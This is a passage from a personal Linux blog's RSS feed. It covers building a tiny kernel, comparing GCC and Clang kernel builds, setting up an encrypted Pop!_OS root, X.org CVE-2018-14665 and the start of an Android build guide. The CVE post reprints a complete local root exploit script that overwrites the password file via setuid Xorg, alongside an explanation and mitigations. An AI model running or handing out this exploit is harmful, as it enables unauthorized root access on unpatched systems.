+<p><picture><source type="image/avif" srcset="https://weeraman.com/images/building-a-tiny-linux-kernel/kernel-menuconfig-initrd.avif, https://weeraman.com/images/building-a-tiny-linux-kernel/kernel-menuconfig-initrd-400w.avif 400w, https://weeraman.com/images/building-a-tiny-linux-kernel/kernel-menuconfig-initrd-800w.avif 800w, https://weeraman.com/images/building-a-tiny-linux-kernel/kernel-menuconfig-initrd-1200w.avif 1200w" sizes="(max-width: 640px) 400px, (max-width: 1024px) 800px, 1200px"/><source type="image/webp" srcset="https://weeraman.com/images/building-a-tiny-linux-kernel/kernel-menuconfig-initrd.webp, https://weeraman.com/images/building-a-tiny-linux-kernel/kernel-menuconfig-initrd-400w.webp 400w, https://weeraman.com/images/building-a-tiny-linux-kernel/kernel-menuconfig-initrd-800w.webp 800w, https://weeraman.com/images/building-a-tiny-linux-kernel/kernel-menuconfig-initrd-1200w.webp 1200w" sizes="(max-width: 640px) 400px, (max-width: 1024px) 800px, 1200px"/><source srcset="https://weeraman.com/images/building-a-tiny-linux-kernel/kernel-menuconfig-initrd.png, https://weeraman.com/images/building-a-tiny-linux-kernel/kernel-menuconfig-initrd-400w.png 400w, https://weeraman.com/images/building-a-tiny-linux-kernel/kernel-menuconfig-initrd-800w.png 800w, https://weeraman.com/images/building-a-tiny-linux-kernel/kernel-menuconfig-initrd-1200w.png 1200w" sizes="(max-width: 640px) 400px, (max-width: 1024px) 800px, 1200px"/><img src="https://weeraman.com/images/building-a-tiny-linux-kernel/kernel-menuconfig-initrd.png" alt="" loading="lazy" decoding="async" class="max-w-full h-auto"/></picture></p>
+<p>I have only included support for gzip compression and disabled the rest.</p>
+<p>We will also need to enable ELF-support to be able to start up the shell:</p>
+<p><picture><source type="image/avif" srcset="https://weeraman.com/images/building-a-tiny-linux-kernel/kernel-menuconfig-elf-support.avif, https://weeraman.com/images/building-a-tiny-linux-kernel/kernel-menuconfig-elf-support-400w.avif 400w, https://weeraman.com/images/building-a-tiny-linux-kernel/kernel-menuconfig-elf-support-800w.avif 800w, https://weeraman.com/images/building-a-tiny-linux-kernel/kernel-menuconfig-elf-support-1200w.avif 1200w" sizes="(max-width: 640px) 400px, (max-width: 1024px) 800px, 1200px"/><source type="image/webp" srcset="https://weeraman.com/images/building-a-tiny-linux-kernel/kernel-menuconfig-elf-support.webp, https://weeraman.com/images/building-a-tiny-linux-kernel/kernel-menuconfig-elf-support-400w.webp 400w, https://weeraman.com/images/building-a-tiny-linux-kernel/kernel-menuconfig-elf-support-800w.webp 800w, https://weeraman.com/images/building-a-tiny-linux-kernel/kernel-menuconfig-elf-support-1200w.webp 1200w" sizes="(max-width: 640px) 400px, (max-width: 1024px) 800px, 1200px"/><source srcset="https://weeraman.com/images/building-a-tiny-linux-kernel/kernel-menuconfig-elf-support.png, https://weeraman.com/images/building-a-tiny-linux-kernel/kernel-menuconfig-elf-support-400w.png 400w, https://weeraman.com/images/building-a-tiny-linux-kernel/kernel-menuconfig-elf-support-800w.png 800w, https://weeraman.com/images/building-a-tiny-linux-kernel/kernel-menuconfig-elf-support-1200w.png 1200w" sizes="(max-width: 640px) 400px, (max-width: 1024px) 800px, 1200px"/><img src="https://weeraman.com/images/building-a-tiny-linux-kernel/kernel-menuconfig-elf-support.png" alt="" loading="lazy" decoding="async" class="max-w-full h-auto"/></picture></p>
+<p>This time, when booting the kernel, pass in the -initrd argument and specify the initrd image that we created earlier, in addition to an argument to the kernel to specify the binary that it should look for in the ram disk and execute once the kernel has finished booting, which is in this case is ‘/bin/sh’.</p>
+<pre><code>$ qemu-system-x86_64 -kernel arch/x86/boot/bzImage -initrd kernel-utils/initramfs.cpio.gz -append &quot;init=/bin/sh&quot;
+</code></pre>
+<p>And we have a shell.</p>
+<p>Let’s enable the /proc filesystem so we can run some standard commands:</p>
+<p><picture><source type="image/avif" srcset="https://weeraman.com/images/building-a-tiny-linux-kernel/kernel-menuconfig-proc-filesystem.avif, https://weeraman.com/images/building-a-tiny-linux-kernel/kernel-menuconfig-proc-filesystem-400w.avif 400w, https://weeraman.com/images/building-a-tiny-linux-kernel/kernel-menuconfig-proc-filesystem-800w.avif 800w, https://weeraman.com/images/building-a-tiny-linux-kernel/kernel-menuconfig-proc-filesystem-1200w.avif 1200w" sizes="(max-width: 640px) 400px, (max-width: 1024px) 800px, 1200px"/><source type="image/webp" srcset="https://weeraman.com/images/building-a-tiny-linux-kernel/kernel-menuconfig-proc-filesystem.webp, https://weeraman.com/images/building-a-tiny-linux-kernel/kernel-menuconfig-proc-filesystem-400w.webp 400w, https://weeraman.com/images/building-a-tiny-linux-kernel/kernel-menuconfig-proc-filesystem-800w.webp 800w, https://weeraman.com/images/building-a-tiny-linux-kernel/kernel-menuconfig-proc-filesystem-1200w.webp 1200w" sizes="(max-width: 640px) 400px, (max-width: 1024px) 800px, 1200px"/><source srcset="https://weeraman.com/images/building-a-tiny-linux-kernel/kernel-menuconfig-proc-filesystem.png, https://weeraman.com/images/building-a-tiny-linux-kernel/kernel-menuconfig-proc-filesystem-400w.png 400w, https://weeraman.com/images/building-a-tiny-linux-kernel/kernel-menuconfig-proc-filesystem-800w.png 800w, https://weeraman.com/images/building-a-tiny-linux-kernel/kernel-menuconfig-proc-filesystem-1200w.png 1200w" sizes="(max-width: 640px) 400px, (max-width: 1024px) 800px, 1200px"/><img src="https://weeraman.com/images/building-a-tiny-linux-kernel/kernel-menuconfig-proc-filesystem.png" alt="" loading="lazy" decoding="async" class="max-w-full h-auto"/></picture></p>
+<p>Mount the proc file system after booting, so you can use commands like ‘ps’ and ‘free’:</p>
+<p><picture><source type="image/avif" srcset="https://weeraman.com/images/building-a-tiny-linux-kernel/kernel-shell-proc-mounted.avif, https://weeraman.com/images/building-a-tiny-linux-kernel/kernel-shell-proc-mounted-400w.avif 400w, https://weeraman.com/images/building-a-tiny-linux-kernel/kernel-shell-proc-mounted-800w.avif 800w, https://weeraman.com/images/building-a-tiny-linux-kernel/kernel-shell-proc-mounted-1200w.avif 1200w" sizes="(max-width: 640px) 400px, (max-width: 1024px) 800px, 1200px"/><source type="image/webp" srcset="https://weeraman.com/images/building-a-tiny-linux-kernel/kernel-shell-proc-mounted.webp, https://weeraman.com/images/building-a-tiny-linux-kernel/kernel-shell-proc-mounted-400w.webp 400w, https://weeraman.com/images/building-a-tiny-linux-kernel/kernel-shell-proc-mounted-800w.webp 800w, https://weeraman.com/images/building-a-tiny-linux-kernel/kernel-shell-proc-mounted-1200w.webp 1200w" sizes="(max-width: 640px) 400px, (max-width: 1024px) 800px, 1200px"/><source srcset="https://weeraman.com/images/building-a-tiny-linux-kernel/kernel-shell-proc-mounted.png, https://weeraman.com/images/building-a-tiny-linux-kernel/kernel-shell-proc-mounted-400w.png 400w, https://weeraman.com/images/building-a-tiny-linux-kernel/kernel-shell-proc-mounted-800w.png 800w, https://weeraman.com/images/building-a-tiny-linux-kernel/kernel-shell-proc-mounted-1200w.png 1200w" sizes="(max-width: 640px) 400px, (max-width: 1024px) 800px, 1200px"/><img src="https://weeraman.com/images/building-a-tiny-linux-kernel/kernel-shell-proc-mounted.png" alt="" loading="lazy" decoding="async" class="max-w-full h-auto"/></picture></p>
+<p>Here’s the size of the kernel that we just built:</p>
+<pre><code>Setup is 13788 bytes (padded to 13824 bytes).
+System is 793 kB
+</code></pre>
+<p>Note that this is the size of the compressed kernel on disk and the actual memory used at boot time is comparable to the size of the generated vmlinux file, which in this case is 12MB. You would need at least that much memory to load the kernel into memory, plus 8–16MB additionally for the user space. Here’s the minimum memory configuration that allowed me to boot this kernel in qemu:</p>
+<pre><code>$ qemu-system-x86_64 -kernel arch/x86/boot/bzImage -initrd kernel-utils/initramfs.cpio.gz -append &quot;init=/bin/sh&quot; -m 29M
+</code></pre>
+<p>Just for kicks, I disabled printk and booted up the kernel, that put me into a shell almost immediately:</p>
+<p><picture><source type="image/avif" srcset="https://weeraman.com/images/building-a-tiny-linux-kernel/kernel-boot-instant-shell.avif, https://weeraman.com/images/building-a-tiny-linux-kernel/kernel-boot-instant-shell-400w.avif 400w, https://weeraman.com/images/building-a-tiny-linux-kernel/kernel-boot-instant-shell-800w.avif 800w, https://weeraman.com/images/building-a-tiny-linux-kernel/kernel-boot-instant-shell-1200w.avif 1200w" sizes="(max-width: 640px) 400px, (max-width: 1024px) 800px, 1200px"/><source type="image/webp" srcset="https://weeraman.com/images/building-a-tiny-linux-kernel/kernel-boot-instant-shell.webp, https://weeraman.com/images/building-a-tiny-linux-kernel/kernel-boot-instant-shell-400w.webp 400w, https://weeraman.com/images/building-a-tiny-linux-kernel/kernel-boot-instant-shell-800w.webp 800w, https://weeraman.com/images/building-a-tiny-linux-kernel/kernel-boot-instant-shell-1200w.webp 1200w" sizes="(max-width: 640px) 400px, (max-width: 1024px) 800px, 1200px"/><source srcset="https://weeraman.com/images/building-a-tiny-linux-kernel/kernel-boot-instant-shell.png, https://weeraman.com/images/building-a-tiny-linux-kernel/kernel-boot-instant-shell-400w.png 400w, https://weeraman.com/images/building-a-tiny-linux-kernel/kernel-boot-instant-shell-800w.png 800w, https://weeraman.com/images/building-a-tiny-linux-kernel/kernel-boot-instant-shell-1200w.png 1200w" sizes="(max-width: 640px) 400px, (max-width: 1024px) 800px, 1200px"/><img src="https://weeraman.com/images/building-a-tiny-linux-kernel/kernel-boot-instant-shell.png" alt="" loading="lazy" decoding="async" class="max-w-full h-auto"/></picture></p>
+<p>Finally, the compressed kernel size comes down to:</p>
+<pre><code>Setup is 13788 bytes (padded to 13824 bytes).
+System is 749 kB
+</code></pre></div>]]></content:encoded>
+    </item>
+    <item>
+      <title>Compiling the Linux Kernel with Clang</title>
+      <link>https://weeraman.com/compiling-the-linux-kernel-with-clang</link>
+      <guid isPermaLink="true">https://weeraman.com/compiling-the-linux-kernel-with-clang</guid>
+      <pubDate>Thu, 20 Feb 2020 00:00:00 GMT</pubDate>
+      <dc:creator>Anuradha Weeraman</dc:creator>
+      <description><![CDATA[I decided to give Clang a spin to compile the kernel, and given that I'm not exactly an early adopter in attempting this, it was pretty smooth and straightforward overall. All it took was make CC=clang HOSTCC=clang -j12.]]></description>
+      <media:content url="https://weeraman.com/images/compiling-the-linux-kernel-with-clang/cymbals-compilation.jpg" medium="image" />
+      <content:encoded><![CDATA[<figure><img src="https://weeraman.com/images/compiling-the-linux-kernel-with-clang/cymbals-compilation.jpg" alt="Compiling the Linux Kernel with Clang" /></figure><div><p>I decided to give Clang a spin to compile the kernel, and given that I’m not exactly an early adopter in attempting this, it was pretty smooth and straightforward overall. All it took was:</p>
+<pre><code>$ make CC=clang HOSTCC=clang -j12
+</code></pre>
+<p>I also did a quick comparison of the output of the two compilers with a standard ‘defconfig’ with CONFIG_DEBUG_INFO=y enabled on x86_64:</p>
+<p>With GCC 9.2.1:</p>
+<ul>
+<li>
+<p>Build #1: real 3m38.073s, user 31m22.669s, sys 3m17.740s</p>
+</li>
+<li>
+<p>Build #2: real 3m46.561s, user 31m58.313s, sys 3m22.958s</p>
+</li>
+<li>
+<p>Build #3: real 3m38.174s, user 31m33.390s, sys 3m19.014s
+With Clang 9.0.0:</p>
+</li>
+<li>
+<p>Build #1: real 5m21.978s, user 50m45.085s, sys 3m55.455s</p>
+</li>
+<li>
+<p>Build #2: real 5m22.094s, user 50m44.977s, sys 3m53.522s</p>
+</li>
+<li>
+<p>Build #3: real 5m17.531s, user 50m29.478s, sys 3m52.730s
+It appears that the compile time was up by nearly 50% with Clang.</p>
+</li>
+</ul>
+<p>Next, a comparison of the vmlinux file generated by the two compilers. CONFIG_DEBUG_INFO is enabled:</p>
+<ul>
+<li>
+<p>GCC 9.2.1:** 739M**</p>
+</li>
+<li>
+<p>Clang 9.0.0:** 544M**
+This was a little interesting at first since the GCC generated kernel is 35% bigger than the Clang generated one. I decided to do another test with CONFIG_DEBUG_INFO disabled for comparison.</p>
+</li>
+<li>
+<p>GCC 9.2.1:** vmlinux 57M (31M stripped), bzImage 8.7M**</p>
+</li>
+<li>
+<p>Clang 9.0.0:** vmlinux 57M (31M stripped), bzImage 8.9M**
+With debug information stripped, it comes around to the same size, so both are even on this. The compile-time performance was similarly noticeable in this case as well. While faster than with debugging symbols enabled, Clang took longer to build compared to GCC.</p>
+</li>
+<li>
+<p>GCC 9.2.1   : real 2m40.687s, user 26m0.946s, sys 2m36.858s</p>
+</li>
+<li>
+<p>Clang 9.0.0 : real 4m41.045s, user 46m9.836s, sys 3m18.187s
+Next, I took a very crude look at kernel + systemd start time to login prompt on a qemu emulator, to see if there was any difference to execution speeds and here’s what I saw during three iterations:</p>
+</li>
+<li>
+<p>GCC 9.2.1 : 3.85s, 3.98s, 3.74s</p>
+</li>
+<li>
+<p>Clang     : 3.70s, 3.62s, 3.70s
+While it’s a somewhat crude metric, I think the perceived variance is not significant or perceptible at least for the casual user, and would also claim things to be more or less even on this front.</p>
+</li>
+</ul>
+<p>Overall, I think it’s good to have options for open source compilers and I’m glad that Clang has come into the picture as a serious contender for the domination that GCC endured over many decades.</p></div>]]></content:encoded>
+    </item>
+    <item>
+      <title>Linux on the Desktop: a cautionary tale of distributions, GPUs and encrypted filesystems</title>
+      <link>https://weeraman.com/linux-on-the-desktop-a-cautionary-tale-of-distributions-gpus-and-encrypted-filesystems</link>
+      <guid isPermaLink="true">https://weeraman.com/linux-on-the-desktop-a-cautionary-tale-of-distributions-gpus-and-encrypted-filesystems</guid>
+      <pubDate>Fri, 27 Sep 2019 00:00:00 GMT</pubDate>
+      <dc:creator>Anuradha Weeraman</dc:creator>
+      <description><![CDATA[In the last 24 hours, I have been experimenting with this interestingly named and absolutely gorgeous Linux distribution called Pop!_OS by System76. An Ubuntu derivative, it features an extremely polished user experience and I was taken aback by its aesthetic and charming simplicity, which led me to some comparisons, quite unfairly with Debian.]]></description>
+      <media:content url="https://weeraman.com/images/linux-on-the-desktop-a-cautionary-tale-of-distributions-gpus-and-encrypted-filesystems/linux-desktop-operating-system.jpg" medium="image" />
+      <content:encoded><![CDATA[<figure><img src="https://weeraman.com/images/linux-on-the-desktop-a-cautionary-tale-of-distributions-gpus-and-encrypted-filesystems/linux-desktop-operating-system.jpg" alt="Linux on the Desktop: a cautionary tale of distributions, GPUs and encrypted filesystems" /></figure><div><p>In the last 24 hours, I have been experimenting with this interestingly named and absolutely gorgeous Linux distribution called Pop!_OS by <a href="https://system76.com/" target="_blank" rel="noopener noreferrer">System76</a> (a maker of Linux-friendly hardware). An Ubuntu derivative, it features an extremely polished user experience and I was taken aback by its aesthetic and charming simplicity, which led me to some comparisons, quite unfairly with Debian.</p>
+<p>I first started using Debian back in 2000, when I got a few CDs of Debian 2.2 (the “Potato” release) from my good friend and namesake <a href="https://www.sayura.net/anuradha/" target="_blank" rel="noopener noreferrer">Anuradha Ratnaweera</a>. It was a time when distributions were passed around like joints in a tight circle of like-minded hipsters and rebels for whom Linux was the gateway drug to the expansive world of Unix, Free software and activism.</p>
+<p>Debian has always been and will continue to be the uber-distribution. With hundreds of offshoots, it is a testament to its longevity, and the excellent foundation that it has built over the years. There was a period of time about ten years ago that I was actively contributing to Debian, but have since lapsed due to the time commitment needed. It was a fun time, special shout out to my Debian mentor <a href="http://www.gniibe.org/" target="_blank" rel="noopener noreferrer">Niibe Yutaka</a>.</p>
+<p><picture><source type="image/avif" srcset="https://weeraman.com/images/linux-on-the-desktop-a-cautionary-tale-of-distributions-gpus-and-encrypted-filesystems/fsf-meetup-mit-2006.avif, https://weeraman.com/images/linux-on-the-desktop-a-cautionary-tale-of-distributions-gpus-and-encrypted-filesystems/fsf-meetup-mit-2006-400w.avif 400w, https://weeraman.com/images/linux-on-the-desktop-a-cautionary-tale-of-distributions-gpus-and-encrypted-filesystems/fsf-meetup-mit-2006-800w.avif 800w, https://weeraman.com/images/linux-on-the-desktop-a-cautionary-tale-of-distributions-gpus-and-encrypted-filesystems/fsf-meetup-mit-2006-1200w.avif 1200w" sizes="(max-width: 640px) 400px, (max-width: 1024px) 800px, 1200px"/><source type="image/webp" srcset="https://weeraman.com/images/linux-on-the-desktop-a-cautionary-tale-of-distributions-gpus-and-encrypted-filesystems/fsf-meetup-mit-2006.webp, https://weeraman.com/images/linux-on-the-desktop-a-cautionary-tale-of-distributions-gpus-and-encrypted-filesystems/fsf-meetup-mit-2006-400w.webp 400w, https://weeraman.com/images/linux-on-the-desktop-a-cautionary-tale-of-distributions-gpus-and-encrypted-filesystems/fsf-meetup-mit-2006-800w.webp 800w, https://weeraman.com/images/linux-on-the-desktop-a-cautionary-tale-of-distributions-gpus-and-encrypted-filesystems/fsf-meetup-mit-2006-1200w.webp 1200w" sizes="(max-width: 640px) 400px, (max-width: 1024px) 800px, 1200px"/><source srcset="https://weeraman.com/images/linux-on-the-desktop-a-cautionary-tale-of-distributions-gpus-and-encrypted-filesystems/fsf-meetup-mit-2006.jpg, https://weeraman.com/images/linux-on-the-desktop-a-cautionary-tale-of-distributions-gpus-and-encrypted-filesystems/fsf-meetup-mit-2006-400w.jpg 400w, https://weeraman.com/images/linux-on-the-desktop-a-cautionary-tale-of-distributions-gpus-and-encrypted-filesystems/fsf-meetup-mit-2006-800w.jpg 800w, https://weeraman.com/images/linux-on-the-desktop-a-cautionary-tale-of-distributions-gpus-and-encrypted-filesystems/fsf-meetup-mit-2006-1200w.jpg 1200w" sizes="(max-width: 640px) 400px, (max-width: 1024px) 800px, 1200px"/><img src="https://weeraman.com/images/linux-on-the-desktop-a-cautionary-tale-of-distributions-gpus-and-encrypted-filesystems/fsf-meetup-mit-2006.jpg" alt="With Niibe at an FSF meetup at MIT, 2006." loading="lazy" decoding="async" class="max-w-full h-auto"/></picture></p>
+<p><em>With Niibe at an FSF meetup at MIT, 2006.</em></p>
+<p>At the time, Debian had a stable curses installer, and installation meant pecking at the enter key about 20 times, enter a few details and passwords and you’re good to go — this was miles ahead of text mode installers. 20 years later, things haven’t changed much on this front for Debian. Enter Pop!_OS. While still based on Ubuntu, the whole design aesthetic is so much cleaner and elegant, required very little user input and before I knew it, the installation was done and I was dual-booting.</p>
+<p>There used to be a time, when you install X, configure XF86Config by hand, run xinit, breathe a sigh of relief when you see the checkered background and decoration-less terminal and spend hours tweaking files, layering-in the right window manager, applets, backgrounds and themes until you have a desktop that you can truly be proud of and really call your own. No two desktops were alike. The process of getting an <a href="https://wiki.debian.org/NvidiaGraphicsDrivers/Optimus" target="_blank" rel="noopener noreferrer">Nvidia Optimus</a> hardware setup on Debian, still feels a lot like those days, with Xorg configuration, xrandr, display managers requiring non-trivial time commitment to get things working on a dual-monitor setup the way you really want. This doesn’t take into account the myriad of ways this can be achieved through <a href="https://wiki.debian.org/Bumblebee" target="_blank" rel="noopener noreferrer">Bumblebee</a>, <a href="https://wiki.archlinux.org/index.php/Nvidia-xrun" target="_blank" rel="noopener noreferrer">nvidia-xrun</a> and the like.</p>
+<p>Pop!_OS (and Ubuntu as well for that matter) just works. I know it ain’t “Free”, yeah it uses blobs, and the kernel’s tainted, but the GPU does work, and power management is “better”, and I have two days back and can actually work rather than getting things to work. The activist in me would have balked at this ten years ago, but its a different time, and Free software is now the norm rather than the exception. There are still subtleties of “Freedom” and liberties that still concern and do matter, but for the most part, the battle is won.</p>
+<p>But, as it is with all things, it’s not always that simple. For instance, while Pop! (I’ll just call it that) installs easily, its custom-mode installer doesn’t encrypt the root file system by default, nor is there an option to do so in 19.04. Sigh.</p>
+<p>But here’s what I discovered. If you give Pop! a pre-encrypted root filesystem, it will happily mount it, install itself and upon booting, exit into an initrd shell when it fails to find root. To get around this, use the Pop! live distro on USB, and perform the following to get Pop! to boot with the encrypted filesystem. I had some help from <a href="https://support.system76.com/articles/bootloader/" target="_blank" rel="noopener noreferrer">this link right here</a>:</p>
+<pre><code>$ sudo bash
+</code></pre>
+<p>Cos I hate repeating myself and I never liked ‘su’ much.</p>
+<pre><code># cryptsetup luksOpen /dev/nvmeXX cryptroot
+# mount /dev/mapper/cryptroot /mnt
+# mount /dev/nvmeYY /mnt/boot/efi
+</code></pre>
+<p>Yes, Pop! uses systemd-boot. LILO, Grub, and now systemd-boot. Still remember seeing LI and not LO and thinking “wtf just happened”, but it was a simpler time and troubleshooting was easier, better addressed in a different rant.</p>
+<p>Next, mount the myriad of virtual filesystems and chroot into the rootfs:</p>
+<pre><code># for i in /dev /dev/pts /proc /sys /run; do sudo mount -B $i /mnt$i; done
+# chroot /mnt
+</code></pre>
+<p>Setup /etc/crypttab with the encrypted partitions:</p>
+<pre><code>cryptroot UUID=&lt;UUID&gt; none cipher=aes-xts-plain64,size=256,hash=sha1
+crypthome UUID=&lt;UUID&gt; none cipher=aes-xts-plain64,size=256,hash=sha1
+cryptswap UUID=&lt;UUID&gt; /dev/urandom swap,offset=1024,cipher=aes-xts-plain64,size=512
+</code></pre>
+<p>Configure /etc/fstab:</p>
+<pre><code>/dev/mapper/cryptswap none swap  defaults 0 0
+/dev/mapper/crypthome /home ext4 noatime,errors=remount-ro 0 0
+/dev/mapper/cryptroot / ext4  noatime,errors=remount-ro 0 0
+</code></pre>
+<p>Update /etc/initramfs-tools/conf.d/cryptroot:</p>
+<pre><code>target=cryptroot,source=/dev/nvmeX
+</code></pre>
+<p>Update the initrd and install systemd-boot in to the EFI system partition:</p>
+<pre><code># update-initramfs -c -k all
+# exit
+# bootctl --path=/mnt/boot/efi install
+</code></pre>
+<p>With this in place, reboot and systemd-boot should unceremoniously request your input to unlock the encrypted disks and assuming you got all the UUIDs right, launch the Pop! desktop and request you to create a non-root user. Yes, Pop! does this after installation and not during installation.</p>
+<p>It so happened that I did a software update afterwards and it once again dropped me into an initrd shell from where I had to crawl out and figure out that a new kernel had messed up the boot. I wondered why the triggers or hooks didn’t recreate the initrd and setup the bootloader when it did, but oh well, I went through the above process again to update-initramfs followed by bootctl and I was off to the races again.</p>
+<p>For the record, I still do have a soft spot for Debian. Distros will come and go, but I believe Debian’s in it for the long haul, and while it may not be zippy and flashy like the new kids in town, its the ever reliable. If you’re running a server or anything mission critical, look no further than Debian stable. On the desktop however, Pop! is a good contender, or Debian unstable if you’re so inclined, or both, as I do.</p></div>]]></content:encoded>
+    </item>
+    <item>
+      <title>X.org Security Vulnerability: CVE-2018–14665</title>
+      <link>https://weeraman.com/x-org-security-vulnerability-cve-2018-14665</link>
+      <guid isPermaLink="true">https://weeraman.com/x-org-security-vulnerability-cve-2018-14665</guid>
+      <pubDate>Fri, 26 Oct 2018 00:00:00 GMT</pubDate>
+      <dc:creator>Anuradha Weeraman</dc:creator>
+      <description><![CDATA[X Windows, and the popular fork X.org, is notorious for security issues and vulnerabilities. Most recently, a bug in X.org that has been around for nearly two years and is trivial to exploit has been disclosed.]]></description>
+      <media:content url="https://weeraman.com/images/x-org-security-vulnerability-cve-2018-14665/broken-window-xorg.jpg" medium="image" />
+      <content:encoded><![CDATA[<figure><img src="https://weeraman.com/images/x-org-security-vulnerability-cve-2018-14665/broken-window-xorg.jpg" alt="X.org Security Vulnerability: CVE-2018–14665" /></figure><div><p>X Windows, and the popular fork <a href="https://www.x.org/wiki/" target="_blank" rel="noopener noreferrer">X.org</a>, is notorious for security issues and vulnerabilities. Most recently, a bug in X.org that has been around for nearly two years and is trivial to exploit has been <a href="https://lists.x.org/archives/xorg-announce/2018-October/002927.html" target="_blank" rel="noopener noreferrer">disclosed</a>. It makes use of two command line arguments (-logfile and -modulepath) that overwrite files and can be used for privilege escalation if X runs with setuid root.</p>
+<p>Even OpenBSD is not immune from this attack, as shown here by the simple exploit by <a href="https://t.co/3FqgJPeCvO" target="_blank" rel="noopener noreferrer">hacker.house</a>.** Disclaimer**: do not try this on critical systems. Use only for assessment on systems you own or are authorized to run this.</p>
+<pre><code>#!/bin/sh
+# local privilege escalation in X11 currently
+# unpatched in OpenBSD 6.4 stable - exploit
+# uses cve-2018-14665 to overwrite files as root.
+# Impacts Xorg 1.19.0 - 1.20.2 which ships setuid
+# and vulnerable in default OpenBSD.
+#
+# - https://hacker.house
+echo [+] OpenBSD 6.4-stable local root exploit
+cd /etc
+Xorg -fp &#x27;root:$2b$08$As7rA9IO2lsfSyb7OkESWueQFzgbDfCXw0JXjjYszKa8Aklt5RTSG:0:0:daemon:0:0:Charlie &amp;:/root:/bin/ksh&#x27; -logfile master.passwd :1 &amp;
+sleep 5
+pkill Xorg
+echo [-] dont forget to mv and chmod /etc/master.passwd.old back
+echo [+] type &#x27;Password1&#x27; and hit enter for root
+su -
+</code></pre>
+<p>The exploit above passes the /etc/master.passwd file on an OpenBSD system as an input to the -logfile argument of Xorg along with the -fp argument which specifies the font path. Since Xorg is running as root in this case as a result of the setuid bit, it will log the font path provided in the command line overwriting the password file with the crafted entry that can be used to escalate the privileges.</p>
+<p>How can you protect yourself from this:</p>
+<ol>
+<li>
+<p>Remove the setuid bit on the Xorg binary. This may cause disruptions for individuals starting X directly. This can be considered as a stop-gap until appropriate countermeasures are in place.</p>
+</li>
+<li>
+<p>Make use of a display manager to start the X sessions, so that the Xorg binary does not require root privileges. In the meantime, pick up the security updates to Xorg from your distribution as and when it becomes available.</p>
+</li>
+<li>
+<p>Uninstall Xorg from systems that don’t need it. Even if it is not running, it provides an avenue for hackers to exploit a vulnerability simply by virtue of the vulnerable application being installed, such as in this case. It is always a good practice to only install applications and packages that are required on critical systems to prevent vulnerabilities from providing an attack vector for malicious actors. For instance, an arbitrary code execution vulnerability in a web application can be used to remotely exploit this vulnerability and gain a remote shell without requiring a local account access.
+On a different note, while it’s important for public disclosures of this type of vulnerability, it is also important to provide time for affected distributions to take action so that it doesn’t cause widespread havoc given how easy it is to run the exploit. At the time of this writing, here’s the status of the Xorg package on Debian with respect to this CVE:</p>
+</li>
+</ol>
+<p><picture><source type="image/avif" srcset="https://weeraman.com/images/x-org-security-vulnerability-cve-2018-14665/debian-security-tracker-xorg.avif, https://weeraman.com/images/x-org-security-vulnerability-cve-2018-14665/debian-security-tracker-xorg-400w.avif 400w, https://weeraman.com/images/x-org-security-vulnerability-cve-2018-14665/debian-security-tracker-xorg-800w.avif 800w, https://weeraman.com/images/x-org-security-vulnerability-cve-2018-14665/debian-security-tracker-xorg-1200w.avif 1200w" sizes="(max-width: 640px) 400px, (max-width: 1024px) 800px, 1200px"/><source type="image/webp" srcset="https://weeraman.com/images/x-org-security-vulnerability-cve-2018-14665/debian-security-tracker-xorg.webp, https://weeraman.com/images/x-org-security-vulnerability-cve-2018-14665/debian-security-tracker-xorg-400w.webp 400w, https://weeraman.com/images/x-org-security-vulnerability-cve-2018-14665/debian-security-tracker-xorg-800w.webp 800w, https://weeraman.com/images/x-org-security-vulnerability-cve-2018-14665/debian-security-tracker-xorg-1200w.webp 1200w" sizes="(max-width: 640px) 400px, (max-width: 1024px) 800px, 1200px"/><source srcset="https://weeraman.com/images/x-org-security-vulnerability-cve-2018-14665/debian-security-tracker-xorg.png, https://weeraman.com/images/x-org-security-vulnerability-cve-2018-14665/debian-security-tracker-xorg-400w.png 400w, https://weeraman.com/images/x-org-security-vulnerability-cve-2018-14665/debian-security-tracker-xorg-800w.png 800w, https://weeraman.com/images/x-org-security-vulnerability-cve-2018-14665/debian-security-tracker-xorg-1200w.png 1200w" sizes="(max-width: 640px) 400px, (max-width: 1024px) 800px, 1200px"/><img src="https://weeraman.com/images/x-org-security-vulnerability-cve-2018-14665/debian-security-tracker-xorg.png" alt="" loading="lazy" decoding="async" class="max-w-full h-auto"/></picture></p>
+<p>You can find the most up to date status on the <a href="https://security-tracker.debian.org/tracker/CVE-2018-14665" target="_blank" rel="noopener noreferrer">Debian Security Tracker for this CVE-2018–14665</a>.</p>
+<p>Theo De Raadt of OpenBSD has been <a href="https://marc.info/?l=openbsd-tech&amp;m=154050351216908&amp;w=2" target="_blank" rel="noopener noreferrer">vocal</a> on how the disclosure has taken place given the severity and the widespread affliction of the vulnerability. It is probably indicative of a broader issue surrounding disclosures and finding the right balance to reduce the impact to those affected.</p>
+<p>In the meantime, patch up and stay safe!</p></div>]]></content:encoded>
+    </item>
+    <item>
+      <title>Building Android from source</title>
+      <link>https://weeraman.com/building-android-from-source</link>
+      <guid isPermaLink="true">https://weeraman.com/building-android-from-source</guid>
+      <pubDate>Sun, 15 May 2016 00:00:00 GMT</pubDate>
+      <dc:creator>Anuradha Weeraman</dc:creator>
+      <description><![CDATA[Building Android from source seems like a daunting task at first, but it's really not that hard. I'll walk through the steps as simply as possible to get your first AOSP build running on your handset.]]></description>
+      <media:content url="https://weeraman.com/images/building-android-from-source/android-build-cover.jpg" medium="image" />
+      <content:encoded><![CDATA[<figure><img src="https://weeraman.com/images/building-android-from-source/android-build-cover.jpg" alt="Building Android from source" /></figure><div><p>Building Android from source seems like a daunting task at first, but it’s really not that hard. I’ll walk through the steps as simply as possible to get your first AOSP build running on your handset. This is a rite of passage for many, and guaranteed to give insights on the inner workings of Android. First, let’s do a few push-ups and jumping jacks to mentally and physically prepare for the journey, and at the end of it, you’d wonder why you even had to do that.</p>
+<p>What you need:</p>
+<ul>
+<li>A 64-bit environment</li>
+<li>~150 GB of disk space</li>
+<li>A working Linux installation (I use Debian, but take your pick). I suggest going with bare metal over virtual machines in the interest of sanity and general well being</li>
+<li>A decent broadband connection (to download a significant portion of the internet)</li>
+<li>Some time and patience</li>
+<li>A healthy belief in the supernatural, and their inevitable involvement in the building of large complex codebases</li>
+</ul>
+<p>Everything you need to know about the process is <a href="http://source.android.com/source/index.html" target="_blank" rel="noopener noreferrer">right here</a>. Feel free to skimp through these docs first to get an overview of the entire process. What&#x27;s below is mostly a summary + a few things not explicitly mentioned that would stump the newbies.</p>
+<p><strong>Step 1</strong></p>
